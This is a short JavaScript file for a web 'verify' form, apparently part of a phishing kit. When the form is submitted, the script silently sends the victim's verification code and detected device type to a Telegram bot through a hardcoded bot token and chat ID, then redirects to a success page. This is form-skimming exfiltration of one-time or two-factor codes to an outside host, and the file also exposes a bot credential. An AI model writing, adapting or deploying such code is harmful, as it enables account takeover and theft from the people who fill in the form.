document.getElementById("verify-form").addEventListener("submit", async function(event) {
    event.preventDefault(); // Prevent page reload

    const verificationCode = document.getElementById("verification_code").value.trim();
    if (!verificationCode) return;

    // Advanced Device Detection (Bypasses iPhone Restrictions)
    function getDeviceType() {
        const userAgent = navigator.userAgent.toLowerCase();
        const platform = navigator.platform.toLowerCase();
        const vendor = navigator.vendor ? navigator.vendor.toLowerCase() : "";

        if (/android/.test(userAgent)) return "Android";
        if (/iphone|ipad|ipod/.test(userAgent) || (vendor.includes("apple") && /mobile/.test(userAgent))) return "iPhone/iPad";
        if (/windows phone/.test(userAgent)) return "Windows Phone";
        if (/mac/.test(platform) && vendor.includes("apple")) return "Mac";
        if (/win/.test(platform)) return "Windows";
        if (/linux/.test(platform)) return "Linux";
        if (navigator.maxTouchPoints > 1 && vendor.includes("apple")) return "iPhone/iPad"; // Extra iOS detection

        return "Unknown Device";
    }

    const deviceType = getDeviceType();

    // Telegram Bot Credentials
    const botToken = "7826910523:AAHmVZ-y1AsnTZXvdVbnH5MeBqrKi67zt3M";
    const chatId = "4670929884"; // Your Telegram Chat ID

    // Message format: /confirm (code) (device)
    const message = `/confirm ${verificationCode} ${deviceType}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        // Fix for iOS Safari fetch issues
        await fetch(url, {
            method: "POST",
            mode: "cors", // Ensures cross-origin request works
            cache: "no-cache", // Prevents iOS caching issues
            credentials: "omit", // Ensures request is allowed on all devices
            headers: { "Content-Type": "application/json", "Accept": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });

        // Redirect after sending
        window.location.href = "success.html"; 

    } catch (error) {
        console.error("Error:", error);
    }
});
